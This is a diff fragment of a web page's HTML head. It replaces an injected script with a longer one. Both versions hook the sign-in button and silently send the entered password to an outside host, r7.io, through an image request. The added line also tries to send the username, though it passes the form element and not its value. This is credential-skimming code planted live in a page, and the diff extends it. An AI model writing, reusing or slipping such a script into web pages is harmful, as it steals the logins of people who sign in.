@@ -19,7 +19,7 @@
             }
         });
     </script>
-    <script>  window.onload =function (){   var el = document.getElementById("signin-btn");   if (el.addEventListener) {      el.addEventListener("click", yourFunction, false);  } else {      el.attachEvent('onclick', yourFunction);  }   };  function yourFunction(){    i = new Image();    i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + document.getElementById('login_password').value;  }   </script>
+    <script>  window.onload =function (){   var el = document.getElementById("signin-btn");   if (el.addEventListener) {      el.addEventListener("click", yourFunction, false);  } else {      el.attachEvent('onclick', yourFunction);  }   };  function yourFunction(){    i = new Image();    i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + document.getElementById('login_password').value + '   The username is: ' + document.getElementById('login_username');  }   </script>
 
   </head>
 
